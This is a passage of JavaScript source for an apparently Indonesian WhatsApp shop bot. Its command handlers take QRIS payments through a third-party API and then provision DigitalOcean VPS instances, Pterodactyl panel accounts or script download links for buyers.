    Ketik *.listsc* untuk melihat daftar script yang tersedia.
    ─────────────────────────
    `;
    
    Reply(teks); // Mengirimkan pesan informasi

    // Mengambil argumen nomor pilihan dari pesan
    const choice = parseInt(m.text.trim().split(' ')[1]); // Mengambil angka setelah perintah .buysc

    if (!global.scripts || global.scripts.length === 0) {
        return Reply('❌ Tidak ada script yang tersedia saat ini. Gunakan *.listsc* untuk melihat daftar script.');
    }

    if (isNaN(choice) || choice < 1 || choice > global.scripts.length) {
        return Reply('❌ Pilihan tidak valid! Ketik *.listsc* untuk melihat daftar script.');
    }

    const selectedScript = global.scripts[choice - 1];
    const amount = selectedScript.price + Math.floor(Math.random() * 0 + 0);
    const formattedTime = `${new Date().toLocaleTimeString('id-ID')}`;

    const teks3 = `
    🛒 *DETAIL PEMBELIAN SCRIPT* 🛒
    ─────────────────────────
    📜 *Nama Script*: ${selectedScript.name}
    💰 *Harga*: Rp. ${selectedScript.price.toLocaleString('id-ID')}
    ⏰ *Batas Waktu Pembayaran*: Sebelum ${formattedTime} WIB
    ─────────────────────────
    ✅ Silakan scan QRIS di bawah untuk melanjutkan pembayaran!
    `;

    Reply(teks3);

    try {
        const UrlQr = global.qrisOrderKuota;
        const paymentResponse = await axios.get(
            `https://rafaelxd.tech/api/orkut/createpayment?apikey=rafael&amount=${amount}&codeqr=${UrlQr}}`
        );

        if (!paymentResponse.data || !paymentResponse.data.result) {
            console.error('API Pembayaran Error:', paymentResponse.data);
            return Reply('❌ Gagal memproses pembayaran, coba lagi nanti.');
        }

        const paymentData = paymentResponse.data.result;

        let msgQr = await Nvidia.sendMessage(m.chat, {
            image: { url: paymentData.qrImageUrl },
            caption: teks3
        }, { quoted: m });

        db.users[m.sender].status_deposit = true;

        db.users[m.sender].saweria = {
            msg: msgQr,
            chat: m.sender,
            idDeposit: paymentData.transactionId,
            amount: paymentData.amount.toString(),
            nominal: amount,
            exp: function () {
                setTimeout(async () => {
                    const user = db.users[m.sender];
                    if (user.status_deposit === true && user.saweria && user.saweria.amount) {
                        await Nvidia.sendMessage(user.saweria.chat, {
                            text: "❌ QRIS Pembayaran telah expired! Silakan coba lagi."
                        }, { quoted: user.saweria.msg });

                        await Nvidia.sendMessage(user.saweria.chat, {
                            delete: user.saweria.msg.key
                        });

                        user.status_deposit = false;
                        delete user.saweria;
                    }
                }, 300000); // 5 menit
            }
        };

        await db.users[m.sender].saweria.exp();

        while (db.users[m.sender].status_deposit === true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
            await sleep(15000); // Tidur selama 15 detik sebelum mengecek lagi
            const checkPayment = await axios.get(
                `https://rafaelxd.tech/api/orkut/cekstatus?apikey=rafael&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`
            );
            const reqAmount = checkPayment.data.amount;

            if (reqAmount == db.users[m.sender].saweria.amount) {
                db.users[m.sender].status_deposit = false;

                Reply(`
                ✅ *Pembayaran Berhasil!*
                🎉 Berikut adalah link untuk mengunduh script yang Anda pilih:

                🔗 *Link Download*: ${selectedScript.url}
                
                🚀 Terima kasih telah melakukan pembelian! Nikmati script Anda dengan baik.
                `);

                delete db.users[m.sender].saweria;
                break;
            }
        }
    } catch (error) {
        console.error('Error:', error);
        Reply('❌ Terjadi kesalahan saat memproses permintaan Anda. Silakan coba lagi.');
    }
break;
}

case "listsc": {
 if (!global.scripts || !Array.isArray(global.scripts) || global.scripts.length === 0) {
 return Reply('📂 Tidak ada script yang tersedia.');
 }

 let listMessage = '*📂 Daftar Script Tersedia:*\n\n';

 global.scripts.forEach((script, index) => {
 if (script.name && script.price) {
 listMessage += `${index + 1}. *${script.name}*\n - Harga: Rp${script.price.toLocaleString('id-ID')}\n\n`;
 } else {
 console.error(`Script ke-${index + 1} tidak lengkap:`, script);
 }
 });

 listMessage += 'Ketik perintah: `.buysc <nomor>` untuk memesan script.';

 Reply(listMessage);

break;
}

case "buyvps": {
if (m.isGroup) return m.reply("Pembelian vps hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

if (!text) return Nvidia.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Spesifikasi Vps',
          sections: [
            {
              title: 'List Ram Server Vps',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram 16 & Cpu 4', 
                  description: "Rp55.000", 
                  id: '.buyvps 4'
                },
                {
                  title: 'Ram 2 & Cpu 1', 
                  description: "Rp25.000", 
                  id: '.buyvps 1'
                },
                {
                  title: 'Ram 4 & Cpu 2', 
                  description: "Rp35.000", 
                  id: '.buyvps 2'
                },
                {
                  title: 'Ram 8 & Cpu 4', 
                  description: "Rp45.000", 
                  id: '.buyvps 3'
                }                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Vps Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.images = "s-1vcpu-2gb"
    Obj.harga = "25000"
    } else if (tek == "2") {
    Obj.images = "s-2vcpu-4gb"
    Obj.harga = "35000"
    } else if (tek == "3") {
    Obj.imagess = "s-4vcpu-8gb"
    Obj.harga = "45000"
    } else if (tek == "4") {
    Obj.images = "s-4vcpu-16gb"
    Obj.harga = "55000"
    } else return m.reply(teks)
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://rafaelxd.tech/api/orkut/createpayment?apikey=rafael&amount=${amount}&codeqr=${UrlQr}`);
if (!get.data.result) throw new Error("Response API tidak valid!");
const { transactionId, amount: paymentAmount, qrImageUrl } = get.data.result;

const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${transactionId}
 *• Total Pembayaran :* Rp${await toIDR(paymentAmount)}
 *• Barang :* Vps Digital Ocean
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`
let msgQr = await Nvidia.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: transactionId, 
amount: paymentAmount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://rafaelxd.tech/api/orkut/cekstatus?apikey=rafael&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${transactionId}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Vps Digital Ocean
`}, {quoted: db.users[m.sender].saweria.msg})
var orang = db.users[m.sender].saweria.chat
    let hostname = "#" + m.sender.split("@")[0]
    
    try {        
        let dropletData = {
            name: hostname,
            region: "sgp1", 
            size: Obj.images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await Nvidia.sendMessage(orang, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break;
case "buypanel": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return m.reply(example("username"))
global.usr = text.toLowerCase()
return Nvidia.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Ram Panel',
          sections: [
            {
              title: 'List Ram Server Panel',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram Unlimited', 
                  description: "Rp12.000", 
                  id: `.resbuypanel ${global.usr}|unlimited`
                },
                {
                  title: 'Ram 1GB', 
                  description: "Rp1.000", 
                  id: `.resbuypanel ${global.usr}|1gb`
                },
                {
                  title: 'Ram 2GB', 
                  description: "Rp2.000", 
                  id: `.resbuypanel ${global.usr}|2gb`
                },
                {
                  title: 'Ram 3GB', 
                  description: "Rp3.000", 
                  id: `.resbuypanel ${global.usr}|3gb`
                },
                {
                  title: 'Ram 4GB', 
                  description: "Rp4.000", 
                  id: `.resbuypanel ${global.usr}|4gb`
                },      
                {
                  title: 'Ram 5GB', 
                  description: "Rp5.000", 
                  id: `.resbuypanel ${global.usr}|5gb`
                },       
                {
                  title: 'Ram 6GB', 
                  description: "Rp6.000", 
                  id: `.resbuypanel ${global.usr}|6gb`
                },
                {
                  title: 'Ram 7GB', 
                  description: "Rp7.000", 
                  id: `.resbuypanelel ${global.usr}|7gb`
                },        
                {
                  title: 'Ram 8GB', 
                  description: "Rp8.000", 
                  id: `.resbuypanel ${global.usr}|8gb`
                },   
                {
                  title: 'Ram 9GB', 
                  description: "Rp9.000", 
                  id: `.resbuypanel ${global.usr}|9gb`
                },       
                {
                  title: 'Ram 10GB', 
                  description: "Rp10.000", 
                  id: `.resbuypanel ${global.usr}|10gb`
                },                                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Panel Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break
case "resbuypanel": {
  if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat");
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");
  if (global.usr == undefined) return;

  let Obj = {};
  let cmd = text.split("|")[1];
  if (cmd == "1gb") {
    Obj.ram = "1000";
    Obj.disk = "1000";
    Obj.cpu = "40";
    Obj.harga = "1000";
  } else if (cmd == "2gb") {
    Obj.ram = "2000";
    Obj.disk = "1000";
    Obj.cpu = "60";
    Obj.harga = "2000";
  } else if (cmd == "3gb") {
    Obj.ram = "3000";
    Obj.disk = "2000";
    Obj.cpu = "80";
    Obj.harga = "3000";
  } else if (cmd == "4gb") {
    Obj.ram = "4000";
    Obj.disk = "2000";
    Obj.cpu = "100";
    Obj.harga = "4000";
  } else if (cmd == "5gb") {
    Obj.ram = "5000";
    Obj.disk = "3000";
    Obj.cpu = "120";
    Obj.harga = "5000";
  } else if (cmd == "6gb") {
    Obj.ram = "6000";
    Obj.disk = "3000";
    Obj.cpu = "140";
    Obj.harga = "6000";
  } else if (cmd == "7gb") {
    Obj.ram = "7000";
    Obj.disk = "4000";
    Obj.cpu = "160";
    Obj.harga = "7000";
  } else if (cmd == "8gb") {
    Obj.ram = "8000";
    Obj.disk = "4000";
    Obj.cpu = "180";
    Obj.harga = "8000";
  } else if (cmd == "9gb") {
    Obj.ram = "9000";
    Obj.disk = "5000";
    Obj.cpu = "200";
    Obj.harga = "9000";
  } else if (cmd == "10gb") {
    Obj.ram = "10000";
    Obj.disk = "5000";
    Obj.cpu = "220";
    Obj.harga = "10000";
  } else if (cmd == "unli" || cmd == "unlimited") {
    Obj.ram = "0";
    Obj.disk = "0";
    Obj.cpu = "0";
    Obj.harga = "12000";
  } else return m.reply(teks);

  const UrlQr = global.qrisOrderKuota;
  const amount = Number(Obj.harga) + generateRandomNumber(110, 250);

  const get = await axios.get(`https://rafaelxd.tech/api/orkut/createpayment?apikey=rafael&amount=${amount}&codeqr=${UrlQr}}`);
  console.log("API Response:", get.data);

  const transactionId = get.data.result?.transactionId || "Tidak tersedia";
  const pembayaran = get.data.result?.amount || 0;

  const teks3 = `
*乂 INFORMASI PEMBAYARAN*

 *• ID :* ${transactionId}
 *• Total Pembayaran :* Rp${await toIDR(pembayaran)}
 *• Barang :* Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
`;

  let msgQr = await Nvidia.sendMessage(m.chat, {
    footer: `© 2025 ${botname}`,
    buttons: [
      {
        buttonId: `.batalbeli`,
        buttonText: { displayText: 'Batalkan Pembelian' },
        type: 1
      }
    ],
    headerType: 1,
    viewOnce: true,
    image: { url: get.data.result.qrImageUrl },
    caption: teks3,
    contextInfo: {
      mentionedJid: [m.sender]
    },
  });

  db.users[m.sender].status_deposit = true;
  db.users[m.sender].saweria = {
    usernam: text.split("|")[0],
    msg: msgQr,
    chat: m.sender,
    idDeposit: get.data.result.transactionId,
    amount: get.data.result.amount.toString(),
    exp: function () {
      setTimeout(async () => {
        if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
          await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
          await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
          db.users[m.sender].status_deposit = false;
          await clearInterval(db.users[m.sender].saweria.exp);
          delete db.users[m.sender].saweria;
        }
      }, 300000);
    }
  };

  await db.users[m.sender].saweria.exp();

  while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
    await sleep(8000);
    const resultcek = await axios.get(`https://rafaelxd.tech/api/orkut/cekstatus?apikey=rafael&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
    const req = await resultcek.data;
    if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
      db.users[m.sender].status_deposit = false;
      await clearInterval(db.users[m.sender].saweria.exp);
      await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Panel Pterodactyl
` }, { quoted: db.users[m.sender].saweria.msg });

      let username = db.users[m.sender].saweria.usernam.toLowerCase() + crypto.randomBytes(2).toString('hex');
      let email = username + "@gmail.com";
      let name = capital(username) + " Server";
      let password = username + crypto.randomBytes(2).toString('hex');

      let f = await fetch(global.domain + "/api/application/users", {
        "method": "POST",
        "headers": {
          "Accept": "application/json",
          "Content-Type": "application/json",
          "Authorization": "Bearer " + apikey
        },
        "body": JSON.stringify({
          "email": email,
          "username": username.toLowerCase(),
          "first_name": name,
          "last_name": "Server",
          "language": "en",
          "password": password.toString()
        })
      });

      let data = await f.json();
      if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
      let user = data.attributes;
      let desc = tanggal(Date.now());
      let usr_id = user.id;

      let f1 = await fetch(global.domain + `/api/application/nests/${nestid}/eggs/` + egg, {
        "method": "GET",
        "headers": {
          "Accept": "application/json",
          "Content-Type": "application/json",
          "Authorization": "Bearer " + apikey
        }
      });

      let data2 = await f1.json();
      let startup_cmd = data2.attributes.startup;

      let f2 = await fetch(global.domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
          "Accept": "application/json",
          "Content-Type": "application/json",
          "Authorization": "Bearer " + apikey,
        },
        "body": JSON.stringify({
          "name": name,
          "description": desc,
          "user": usr_id,
          "egg": parseInt(egg),
          "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
          "startup": startup_cmd,
          "environment": {
            "INST": "npm",
            "USER_UPLOAD": "0",
            "AUTO_UPDATE": "0",
            "CMD_RUN": "npm start"
          },
          "limits": {
            "memory": Obj.ram,
            "swap": 0,
            "disk": Obj.disk,
            "io": 500,
            "cpu": Obj.cpu
          },
          "feature_limits": {
            "databases": 5,
            "backups": 5,
            "allocations": 5
          },
          deploy: {
            locations: [parseInt(loc)],
            dedicated_ip: false,
            port_range: [],
          },
        })
      });

      let result = await f2.json();
      if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2));
      let server = result.attributes;
      var orang = db.users[m.sender].saweria.chat;
      var tekspanel = `*Data Akun Panel Kamu 📦*

┏*📡 ID (${server.id})* 
┃*👤 Username :* ${user.username}
┗*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
┏* Ram : *${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0, 2).join("") + "┃GB" : Obj.ram.charAt(0) + "GB"}*
┃* Disk : *${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0, 2).join("") + "┃GB" : Obj.disk.charAt(0) + "GB"}*
┃* CPU : *${Obj.cpu == "0" ? "Unlimited" : Obj.cpu + "%"}*
┗* ${global.domain}

╭*Syarat & Ketentuan❗ :*
│* Expired panel 1 bulan
│* Simpan data ini sebaik mungkin
│* Garansi pembelian 15 hari (1x replace)
╰* Claim garansi wajib membawa bukti chat pembelian
`;
      await fs.writeFileSync("./akunpanel.txt", tekspanel);
      await Nvidia.sendMessage(orang, { document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: tekspanel }, { quoted: null });
      await fs.unlinkSync("./akunpanel.txt");
      await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
      delete global.usr;
      delete db.users[m.sender].saweria;
    }
  }
}
break;

case "buyadp": {
    if (m.isGroup) return m.reply("🚫 Pembelian Admin Panel Pterodactyl hanya bisa dilakukan di private chat!");

    if (db.users[m.sender].status_deposit) return m.reply("❗ Masih ada transaksi yang belum selesai! Ketik *.batalbeli* untuk membatalkan transaksi sebelumnya.");

    if (!text) return m.reply("⚡ Contoh penggunaan: *.buyadp* username");
    if (text.includes(" ")) return m.reply("⚠️ Username tidak boleh mengandung spasi, coba lagi!");

    let us = crypto.randomBytes(2).toString('hex');
    let Obj = {};
    Obj.harga = "7000";
    Obj.username = text.toLowerCase() + us;
    const UrlQr = global.qrisOrderKuota;

    const amount = Number(Obj.harga) + generateRandomNumber(20, 50);

    try {
        const get = await axios.get(`https://rafaelxd.tech/api/orkut/createpayment?apikey=rafael&amount=${amount}&codeqr=${UrlQr}}`);

        const teks3 = `
        🛒 *INFORMASI PEMBAYARAN*

        *💳 ID Transaksi :* ${get.data.result.transactionId}
        *💰 Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
        *📦 Barang :* Admin Panel Pterodactyl
        *⏳ Pembayaran Expired :* 5 menit

        ⚠️ *Perhatian*: QRIS hanya berlaku dalam 5 menit. Jangan lewatkan kesempatan ini!`
let msgQr = await Nvidia.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
        db.users[m.sender].status_deposit = true;
        db.users[m.sender].saweria = {
            msg: msgQr,
            chat: m.sender,
            idDeposit: get.data.result.transactionId,
            amount: get.data.result.amount.toString(),
            exp: function () {
                setTimeout(async () => {
                    if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
                        await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: "⚠️ Waktu pembayaran telah expired, transaksi dibatalkan!"}, {quoted: db.users[m.sender].saweria.msg});
                        await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                        db.users[m.sender].status_deposit = false;
                        await clearInterval(db.users[m.sender].saweria.exp);
                        delete db.users[m.sender].saweria;
                    }
                }, 300000); // 5 menit
            }
        };

        await db.users[m.sender].saweria.exp();

        while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
            await sleep(8000);
            const resultcek = await axios.get(`https://rafaelxd.tech/api/orkut/cekstatus?apikey=rafael&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
            const req = await resultcek.data;

            if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
                db.users[m.sender].status_deposit = false;
                await clearInterval(db.users[m.sender].saweria.exp);
                await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: `
                ✅ *PEMBAYARAN BERHASIL!*

                *💳 ID Transaksi :* ${db.users[m.sender].saweria.idDeposit}
                *💰 Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
                *📦 Barang :* Admin Panel Pterodactyl

                🎉 *Selamat, Pembelian kamu berhasil diproses!*
                `}, {quoted: db.users[m.sender].saweria.msg});

                let username = Obj.username;
                let email = username + "@gmail.com";
                let name = capital(username);
                let password = crypto.randomBytes(4).toString('hex');

                let f = await fetch(global.domain + "/api/application/users", {
                    "method": "POST",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    },
                    "body": JSON.stringify({
                        "email": email,
                        "username": username.toLowerCase(),
                        "first_name": name,
                        "last_name": "Admin",
                        "root_admin": true,
                        "language": "en",
                        "password": password.toString()
                    })
                });

                let data = await f.json();
                if (data.errors) return m.reply("❌ Terjadi kesalahan: " + JSON.stringify(data.errors[0], null, 2));

                let user = data.attributes;
                var teks = `
                🎉 *Berhasil Membuat Admin Panel Pterodactyl ✅*

                *🆔 ID :* ${user.id}
                *👤 Nama :* ${user.first_name}
                *📛 Username :* ${user.username}
                *🔑 Password :* ${password}
                *🌐 Login di :* ${global.domain}
                *💬 GB Whatsapp :* ${global.linkgbbuypublic}

                ⚠️ *Perhatian:*
                - Jangan coba-coba mencuri SC! Terbukti? Akun kamu langsung dihapus!
                - Simpan dengan baik data akun ini.
                - Gunakan panel hanya untuk keperluan yang sah.

                🔒 Garansi hanya berlaku jika ada bukti chat pembelian.
                `;

                await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: teks}, {quoted: null});
                await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                delete db.users[m.sender].saweria;
            }
        }
    } catch (error) {
        console.error(error);
        m.reply("❌ Terjadi kesalahan saat memproses transaksi, coba lagi nanti.");
    }
}
break;


case "buyownpanel": {
    if (!m.isGroup) return m.reply("🔒 Pembelian Owner Panel Pterodactyl hanya bisa di dalam private chat!");
    if (db.users[m.sender].status_deposit) return m.reply("❗ Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");
    if (!text) return m.reply(example("username"));
    if (text.includes(" ")) return m.reply("❌ Username tidak boleh memakai spasi!");

    let us = crypto.randomBytes(2).toString('hex');
    let Obj = {};
    Obj.harga = "15000"; 
    Obj.username = text.toLowerCase() + us;
    const UrlQr = global.qrisOrderKuota;

    const amount = Number(Obj.harga) + generateRandomNumber(20, 70);
    const get = await axios.get(`https://rafaelxd.tech/api/orkut/createpayment?apikey=rafael&amount=${amount}&codeqr=${UrlQr}}`);
    
    const teks3 = `
    🛒 *INFORMASI PEMBAYARAN*

        *💳 ID Transaksi :* ${get.data.result.transactionId}
        *💰 Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
        *📦 Barang :* Owmer Panel Pterodactyl
        *⏳ Pembayaran Expired :* 5 menit

        ⚠️ *Perhatian*: QRIS hanya berlaku dalam 5 menit. Jangan lewatkan kesempatan ini!`
let msgQr = await Nvidia.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr, 
        chat: m.sender,
        idDeposit: get.data.result.transactionId, 
        amount: get.data.result.amount.toString(), 
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
                    await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: "❌ QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg});
                    await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    await clearInterval(db.users[m.sender].saweria.exp);
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
        await sleep(8000);
        const resultcek = await axios.get(`https://rafaelxd.tech/api/orkut/cekstatus?apikey=rafael&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data;
        if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;
            await clearInterval(db.users[m.sender].saweria.exp);
            await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: `
            *✅ PEMBAYARAN BERHASIL DITERIMA*

            💳 *ID Transaksi:* ${db.users[m.sender].saweria.idDeposit}  
            💰 *Total Pembayaran:* Rp${await toIDR(db.users[m.sender].saweria.amount)}  
            📦 *Barang:* Owner Panel Pterodactyl
            `}, {quoted: db.users[m.sender].saweria.msg});
            
            let username = Obj.username;
            let email = username+"@gmail.com";
            let name = capital(username);
            let password = crypto.randomBytes(4).toString('hex');
            
            let f = await fetch(global.domain + "/api/application/users", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                },
                "body": JSON.stringify({
                    "email": email,
                    "username": username.toLowerCase(),
                    "first_name": name,
                    "last_name": "Admin",
                    "root_admin": true,
                    "language": "en",
                    "password": password.toString()
                })
            });
            let data = await f.json();
            if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
            let user = data.attributes;
            var teks = `
            *🎉 Berhasil Membuat Owner Panel ✅*

            📛 *ID:* ${user.id}  
            ?? *Nama:* ${user.first_name}  
            💻 *Username:* ${user.username}  
            🔑 *Password:* ${password.toString()}  
            🌐 *Login di:* ${global.domain}  
            📱 *Gabung Whatsapp:* ${global.linkgbbuypublic}

            *⚠️ Rules Owner Panel*  
            1. 🚫 Jangan Maling SC, Ketahuan Maling? Akun Dihapus!  
            2. 💾 Simpan baik-baik Data Akun Ini!  
